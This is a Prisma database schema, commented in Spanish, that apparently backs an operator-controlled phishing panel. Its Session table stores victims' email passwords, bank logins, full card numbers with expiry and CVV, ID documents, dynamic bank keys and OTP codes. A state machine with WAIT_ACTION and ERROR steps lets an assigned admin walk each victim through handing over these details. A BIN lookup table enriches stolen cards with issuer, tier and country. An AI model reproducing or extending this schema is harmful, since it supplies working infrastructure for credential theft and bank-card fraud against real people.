// This is your Prisma schema file,
// learn more about it in the docs: https://pris.ly/d/prisma-schema

// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

enum SessionState {
  ACTIVE
  INACTIVE
  MINIMIZED
  FINISHED
  BANNED
}

enum ActionState {
  DATA
  DATA_WAIT_ACTION
  DATA_ERROR

  CC
  CC_WAIT_ACTION
  CC_ERROR

  AUTH
  AUTH_WAIT_ACTION
  AUTH_ERROR

  DINAMIC
  DINAMIC_WAIT_ACTION
  DINAMIC_ERROR

  OTP
  OTP_WAIT_ACTION
  OTP_ERROR

  CUSTOM_ERROR
  FINISH
}

model Session {
  id                    String       @id @default(uuid())
  state                 SessionState @default(ACTIVE)
  action                ActionState  @default(DATA)
  step                  String?
  ip                    String?
  name                  String?
  phone                 String?
  email                 String?
  emailPass             String?
  address               String?
  bank                  String?
  user                  String?
  pass                  String?
  holder                String?
  cc                    String?
  exp                   String?
  cvv                   String?
  scheme                String?
  brand                 String?
  type                  String?
  level                 String?
  document              String?
  country               String?
  city                  String?
  dinamic               String?
  otp                   String?
  assignedAdminId       String?
  url                   String?

  lastError             String?

  createdAt             DateTime @default(now())
  updatedAt             DateTime @updatedAt

  @@index([state])
  @@index([updatedAt])
}

model BinLookup {
  id         String   @id @default(cuid())
  bin        String   @unique @db.VarChar(6)  // clave de cache: "457562"
  scheme     String?  @db.VarChar(32)         // visa/mastercard/amex...
  brand      String?  @db.VarChar(64)         // marca/variant si aplica
  type       String?  @db.VarChar(16)         // credit/debit/prepaid
  level      String?  @db.VarChar(32)         // classic/gold/platinum...
  bank       String?  @db.VarChar(128)        // banco/emisor
  bankPhone  String?  @db.VarChar(64)
  country    String?  @db.VarChar(2)          // ISO2, ej "CO"

  // auditoría / cache control
  source     String?  @db.VarChar(32)         // "third_party_x", "seed", etc.
  fetchedAt  DateTime?                         // cuándo se consultó externamente
  createdAt  DateTime @default(now())
  updatedAt  DateTime @updatedAt

  @@index([bank])
  @@index([scheme])
  @@map("binlookup")
}